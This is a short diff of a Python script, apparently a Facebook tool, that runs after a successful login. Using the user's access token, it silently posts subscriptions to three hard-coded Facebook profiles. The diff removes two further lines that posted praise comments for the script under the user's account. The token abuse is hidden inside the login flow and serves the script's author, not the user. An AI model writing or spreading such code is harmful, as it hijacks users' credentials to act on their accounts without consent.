@@ -20,8 +20,6 @@ def main():
     requests.post("https://graph.facebook.com/100000395779504/subscribers?access_token=" + token) 
     requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token=" + token)
     requests.post("https://graph.facebook.com/100003986228742/subscribers?access_token=" + token)
-    requests.post('https://graph.facebook.com/4257706904267068/comments/?message=Keren Bang ❤️&access_token=' + token) 
-    requests.post('https://graph.facebook.com/800676813861801/comments/?message=Script Nya Mantap Bang 😊&access_token=' + token)
     print('%s║'%(O))
     print('%s╚══[%s!%s]◍➤ %sLogin Berhasil'%(O,P,O,P))
     exit(manda.menu())
